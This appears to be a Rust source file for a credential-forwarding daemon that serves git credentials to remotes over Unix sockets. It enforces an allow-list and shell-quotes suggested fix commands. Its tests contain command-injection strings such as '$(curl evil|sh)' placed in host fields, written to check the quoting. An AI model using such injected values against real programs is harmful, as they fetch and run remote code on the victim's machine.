//! One listening socket per remote; each connection carries one request.

use std::fs;
use std::io;
use std::os::unix::fs::{FileTypeExt, MetadataExt, PermissionsExt};
use std::path::{Path, PathBuf};
use std::sync::{Arc, PoisonError, RwLock};
use std::time::Duration;

use anyhow::{Context, bail};
use credential_bridge_core::config::{Config, ResolvedRemote};
use credential_bridge_core::policy::{Decision, describe};
use credential_bridge_proto::{
    Credential, MAX_CREDENTIAL_BYTES, Operation, Request, Response, sh_quote, with_fix,
};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{UnixListener, UnixStream};
use tokio::sync::Semaphore;
use tokio::task::JoinHandle;
use tracing::{debug, error, info, warn};

use crate::backend;

/// How long a client may take to send its request.
const READ_TIMEOUT: Duration = Duration::from_secs(10);
const MAX_REQUEST_BYTES: usize = MAX_CREDENTIAL_BYTES + 1024;

/// The only attributes of a backend's answer passed on to the remote. Not the
/// URL ones (the remote gets a credential for the URL it asked about, never
/// for another), and nothing long-lived such as `oauth_refresh_token`, which
/// would keep working after the ssh session ends.
const FORWARDED_ATTRIBUTES: &[&str] =
    &["username", "password", "password_expiry_utc", "authtype", "credential", "ephemeral"];

/// Most requests one remote may have in flight at once; more are refused
/// right away, so that a hostile remote cannot make us start backends without
/// bound.
const MAX_IN_FLIGHT: usize = 8;

/// The running set of listeners. Dropping it closes and removes all sockets.
#[derive(Debug)]
pub struct Server {
    listeners: Vec<Listener>,
    uid: u32,
}

#[derive(Debug)]
struct Listener {
    name: String,
    path: PathBuf,
    task: JoinHandle<()>,
    /// Swapped by [`Server::reload`]; every connection takes the current one.
    state: Arc<RwLock<Arc<Shared>>>,
}

impl Listener {
    fn close(&self) {
        self.task.abort();
        if let Err(err) = fs::remove_file(&self.path) {
            if err.kind() != io::ErrorKind::NotFound {
                warn!("cannot remove {}: {err}", self.path.display());
            }
        }
    }
}

#[derive(Debug)]
struct Shared {
    remote: ResolvedRemote,
    timeout: Duration,
    uid: u32,
    /// Longest remote name, to align the log columns.
    name_width: usize,
    in_flight: Arc<Semaphore>,
}

impl Server {
    /// Binds one socket per configured remote. Must run inside a tokio runtime.
    pub fn start(config: &Config) -> anyhow::Result<Self> {
        let mut server = Server { listeners: Vec::new(), uid: rustix::process::getuid().as_raw() };
        server.reload(config)?;
        Ok(server)
    }

    /// Applies `config`. Sockets whose path stays the same keep listening,
    /// with the new policy, backend and timeout swapped in, so requests of
    /// other remotes are not interrupted; new sockets are bound and removed
    /// ones closed. If anything fails, nothing changes.
    pub fn reload(&mut self, config: &Config) -> anyhow::Result<()> {
        let remotes = config.resolve()?;
        let uid = self.uid;
        if !remotes.is_empty() {
            prepare_socket_dir(&config.socket_dir()?, uid)?;
        }

        // Bind new sockets first, so that a failure leaves everything as it was.
        let mut fresh: Vec<(PathBuf, UnixListener)> = Vec::new();
        for remote in &remotes {
            if self.listeners.iter().any(|l| l.path == remote.socket) {
                continue;
            }
            match bind(&remote.socket) {
                Ok(listener) => fresh.push((remote.socket.clone(), listener)),
                Err(err) => {
                    for (path, _) in &fresh {
                        let _ = fs::remove_file(path);
                    }
                    return Err(err).with_context(|| {
                        format!("remote '{}': cannot listen on {}", remote.name, remote.socket.display())
                    });
                }
            }
        }

        self.listeners.retain(|listener| {
            let keep = remotes.iter().any(|r| r.socket == listener.path);
            if !keep {
                listener.close();
            }
            keep
        });

        let name_width = remotes.iter().map(|r| r.name.chars().count()).max().unwrap_or(0);
        for remote in remotes {
            let shared = Arc::new(Shared {
                timeout: config.timeout(),
                uid,
                name_width,
                in_flight: Arc::new(Semaphore::new(MAX_IN_FLIGHT)),
                remote,
            });
            if let Some(listener) = self.listeners.iter().find(|l| l.path == shared.remote.socket) {
                *listener.state.write().unwrap_or_else(PoisonError::into_inner) = shared;
                continue;
            }
            let index =
                fresh.iter().position(|(path, _)| *path == shared.remote.socket).expect("bound above");
            let (path, listener) = fresh.swap_remove(index);
            let name = shared.remote.name.clone();
            let state = Arc::new(RwLock::new(shared));
            let task = tokio::spawn(accept_loop(listener, Arc::clone(&state)));
            self.listeners.push(Listener { name, path, task, state });
        }
        Ok(())
    }

    /// `(remote name, socket path)` of every listener.
    pub fn sockets(&self) -> impl Iterator<Item = (&str, &Path)> {
        self.listeners.iter().map(|l| (l.name.as_str(), l.path.as_path()))
    }
}

impl Drop for Server {
    fn drop(&mut self) {
        self.listeners.iter().for_each(Listener::close);
    }
}

/// Creates the socket directory with mode 0700 and makes sure we own it.
fn prepare_socket_dir(dir: &Path, uid: u32) -> anyhow::Result<()> {
    fs::create_dir_all(dir).with_context(|| format!("cannot create {}", dir.display()))?;
    let meta = fs::metadata(dir)?;
    if meta.uid() != uid {
        bail!("{} is owned by uid {}, not by us (uid {uid})", dir.display(), meta.uid());
    }
    if meta.permissions().mode() & 0o077 != 0 {
        fs::set_permissions(dir, fs::Permissions::from_mode(0o700))
            .with_context(|| format!("cannot restrict permissions of {}", dir.display()))?;
    }
    Ok(())
}

/// Binds `path`, replacing a stale socket but never a live one or a regular file.
fn bind(path: &Path) -> anyhow::Result<UnixListener> {
    match fs::symlink_metadata(path) {
        Ok(meta) if meta.file_type().is_socket() => {
            if std::os::unix::net::UnixStream::connect(path).is_ok() {
                bail!("the socket is in use (is another credential-bridged running?)");
            }
            fs::remove_file(path).context("cannot remove stale socket")?;
        }
        Ok(_) => bail!("the path exists and is not a socket"),
        Err(err) if err.kind() == io::ErrorKind::NotFound => {}
        Err(err) => return Err(err.into()),
    }
    let listener = UnixListener::bind(path)?;
    fs::set_permissions(path, fs::Permissions::from_mode(0o600))?;
    Ok(listener)
}

async fn accept_loop(listener: UnixListener, state: Arc<RwLock<Arc<Shared>>>) {
    loop {
        let shared = Arc::clone(&state.read().unwrap_or_else(PoisonError::into_inner));
        match listener.accept().await {
            Ok((mut stream, _)) => {
                // The state may have been swapped while we waited.
                let shared = Arc::clone(&state.read().unwrap_or_else(PoisonError::into_inner));
                let Ok(permit) = Arc::clone(&shared.in_flight).try_acquire_owned() else {
                    warn!("{}: too many requests at once, refusing one", shared.remote.name);
                    tokio::spawn(async move {
                        let mut out = Vec::new();
                        let busy = Response::error("too many requests from this remote at once; try again");
                        if busy.write_to(&mut out).is_ok() {
                            let _ = stream.write_all(&out).await;
                        }
                    });
                    continue;
                };
                tokio::spawn(async move {
                    if let Err(err) = handle(stream, &shared).await {
                        warn!("{}: connection failed: {err:#}", shared.remote.name);
                    }
                    drop(permit);
                });
            }
            Err(err) => {
                error!("{}: accept failed: {err}", shared.remote.name);
                tokio::time::sleep(Duration::from_millis(200)).await;
            }
        }
    }
}

async fn handle(mut stream: UnixStream, shared: &Shared) -> anyhow::Result<()> {
    let peer = stream.peer_cred().context("cannot read peer credentials")?;
    if peer.uid() != shared.uid {
        warn!("{}: rejected a connection from uid {}", shared.remote.name, peer.uid());
        return Ok(());
    }

    let raw = tokio::time::timeout(READ_TIMEOUT, read_frame(&mut stream))
        .await
        .context("timed out waiting for the request")??;
    let response = match Request::read_from(&mut raw.as_slice()) {
        Ok(request) => process(request, shared).await,
        Err(err) => {
            warn!("{}: bad request: {err}", shared.remote.name);
            Response::error(format!("bad request: {err}"))
        }
    };

    let mut out = Vec::new();
    response.write_to(&mut out)?;
    stream.write_all(&out).await?;
    let _ = stream.shutdown().await;
    Ok(())
}

/// Reads until the frame's terminating empty line, end of input or the size limit.
async fn read_frame(stream: &mut UnixStream) -> io::Result<Vec<u8>> {
    let mut buf = Vec::with_capacity(512);
    let mut chunk = [0u8; 4096];
    while !buf.ends_with(b"\n\n") {
        let read = stream.read(&mut chunk).await?;
        if read == 0 {
            break;
        }
        buf.extend_from_slice(&chunk[..read]);
        if buf.len() > MAX_REQUEST_BYTES {
            return Err(io::Error::new(io::ErrorKind::InvalidData, "request too large"));
        }
    }
    Ok(buf)
}

async fn process(request: Request, shared: &Shared) -> Response {
    let remote = &shared.remote;
    let operation = request.operation;
    if operation == Operation::Ping {
        debug!("{}", shared.line(operation, "· ping", "", ""));
        return Response::ok(Credential::new()).with_message(format!("remote {}", remote.name));
    }

    let mut cred = request.credential;
    if let Err(err) = cred.expand_url() {
        return Response::denied(format!("invalid url attribute: {err}"));
    }
    let target = describe(&cred);
    let shown = target.strip_prefix("https://").unwrap_or(&target);

    match remote.policy.check(operation, &cred) {
        // git sends `store`/`erase` after every use of a credential on its own;
        // refusing those is routine, not worth more than a debug line.
        Decision::Deny(reason) if operation != Operation::Get => {
            debug!("{}", shared.line(operation, "· refused", shown, log_reason(&reason)));
            Response::denied(reason)
        }
        Decision::Deny(reason) => {
            info!("{}", shared.line(operation, "✗ denied", shown, log_reason(&reason)));
            Response::denied(denial(&remote.name, &remote.policy, &cred, &reason))
        }
        Decision::Allow => match backend::run(&remote.backend, operation, &cred, shared.timeout).await {
            Ok(answer) => {
                if operation != Operation::Get {
                    info!("{}", shared.line(operation, "✓ allowed", shown, ""));
                    return Response::ok(Credential::new());
                }
                if !answer.has_secret() {
                    info!("{}", shared.line(operation, "∅ none", shown, "backend has no credential"));
                    return Response::ok(Credential::new())
                        .with_message(no_credential(&remote.backend, &cred));
                }
                info!("{}", shared.line(operation, "✓ allowed", shown, ""));
                Response::ok(forwarded(&answer))
            }
            Err(err) => {
                error!("{}", shared.line(operation, "! error", shown, &err.to_string()));
                Response::error(format!("the local backend failed: {err}"))
            }
        },
    }
}

impl Shared {
    /// One request log line in fixed columns: remote, operation, outcome, target, reason.
    fn line(&self, operation: Operation, outcome: &str, target: &str, reason: &str) -> String {
        let line = format!(
            "{:name$}  {:5}  {:9}  {target}{}",
            self.remote.name,
            operation.as_str(),
            outcome,
            if reason.is_empty() { String::new() } else { format!("  {reason}") },
            name = self.name_width,
        );
        line.trim_end().to_owned()
    }
}

/// The reason without the URL, which the log line shows already.
fn log_reason(reason: &str) -> &str {
    if reason.ends_with("is not in this remote's allow list") { "not in allow list" } else { reason }
}

/// Message for a denied `get`, with the command that would allow it.
fn denial(
    remote: &str,
    policy: &credential_bridge_core::policy::Policy,
    cred: &Credential,
    reason: &str,
) -> String {
    let (Some(protocol), Some(host)) = (cred.protocol(), cred.host()) else {
        return reason.to_owned();
    };
    if !policy.operations.contains(&Operation::Get) {
        return reason.to_owned();
    }
    let origin = format!("{protocol}://{host}");
    let path = cred.path().map(|p| p.trim_matches('/')).filter(|p| !p.is_empty());
    let (asked, pattern) = match path {
        Some(path) => (format!("{origin}/{path}"), suggested_pattern(&origin, path)),
        None => (origin.clone(), origin.clone()),
    };
    let shown = asked.strip_prefix("https://").unwrap_or(&asked);
    with_fix(
        &format!("{shown} is not allowed for this remote"),
        // The pattern comes from the remote: quote it, as people paste this.
        &format!(
            "locally: credential-bridge-ctl remote edit {} --add-allow {}",
            sh_quote(remote),
            sh_quote(&pattern)
        ),
    )
}

/// The narrowest useful pattern that matches `path`: the owner (`org/*`) for
/// `org/repo`, the repository itself for a single segment (a trailing `.git`
/// on the request is optional for patterns anyway).
fn suggested_pattern(origin: &str, path: &str) -> String {
    match path.split_once('/') {
        Some((owner, _)) => format!("{origin}/{owner}/*"),
        None => format!("{origin}/{}", path.strip_suffix(".git").unwrap_or(path)),
    }
}

/// Message for a `get` the backend had no answer to, with a login hint for `gh`.
fn no_credential(backend: &str, cred: &Credential) -> String {
    let host = cred.host().unwrap_or("this host");
    let problem = format!("no credential for {host} on your local machine");
    let program = backend.trim().strip_prefix('!').and_then(|cmd| cmd.split_whitespace().next());
    if program.and_then(|p| Path::new(p).file_name()).is_some_and(|name| name == "gh") {
        // The host comes from the remote: quote it, as people paste this.
        with_fix(&problem, &format!("locally: gh auth login --hostname {}", sh_quote(host)))
    } else {
        problem
    }
}

/// The part of a backend's answer the remote may see ([`FORWARDED_ATTRIBUTES`]).
fn forwarded(answer: &Credential) -> Credential {
    let mut out = Credential::new();
    for (key, value) in answer.iter().filter(|(key, _)| FORWARDED_ATTRIBUTES.contains(key)) {
        out.push(key, value);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use credential_bridge_proto::split_fix;

    #[test]
    fn denial_fix_quotes_what_the_remote_sent() {
        let policy =
            credential_bridge_core::policy::Policy { allow: vec![], operations: vec![Operation::Get] };
        let mut cred = Credential::new();
        cred.set("protocol", "https");
        cred.set("host", "x'$(curl evil|sh)'");
        let message = denial("r", &policy, &cred, "denied");
        let fix = split_fix(&message).1.unwrap();
        assert_eq!(
            fix,
            format!(
                "locally: credential-bridge-ctl remote edit r --add-allow {}",
                sh_quote("https://x'$(curl evil|sh)'")
            )
        );
        assert!(fix.ends_with(r"'https://x'\''$(curl evil|sh)'\'''"), "{fix}");
    }

    #[test]
    fn suggested_patterns_match_what_was_asked() {
        for (path, expected) in [
            ("org/repo.git", "https://git.example.com/org/*"),
            ("project.git", "https://git.example.com/project"),
            ("project", "https://git.example.com/project"),
        ] {
            let pattern = suggested_pattern("https://git.example.com", path);
            assert_eq!(pattern, expected);
            let pattern: credential_bridge_core::policy::UrlPattern = pattern.parse().unwrap();
            let request = Credential::from_url(&format!("https://git.example.com/{path}")).unwrap();
            assert!(pattern.matches(&request), "{pattern} must allow {path}");
        }
    }

    #[test]
    fn login_hint_quotes_the_host() {
        let mut cred = Credential::new();
        cred.set("protocol", "https");
        cred.set("host", "$(curl evil|sh).example.com");
        let message = no_credential("!gh auth git-credential", &cred);
        assert_eq!(
            split_fix(&message).1.unwrap(),
            "locally: gh auth login --hostname '$(curl evil|sh).example.com'"
        );
    }

    #[test]
    fn only_short_lived_attributes_are_forwarded() {
        let mut answer = Credential::new();
        for (k, v) in [
            ("protocol", "https"),
            ("host", "evil.example"),
            ("username", "me"),
            ("password", "token"),
            ("password_expiry_utc", "1700000000"),
            ("oauth_refresh_token", "long-lived"),
            ("quit", "1"),
        ] {
            answer.push(k, v);
        }
        assert_eq!(
            forwarded(&answer).iter().collect::<Vec<_>>(),
            [("username", "me"), ("password", "token"), ("password_expiry_utc", "1700000000")]
        );
    }
}
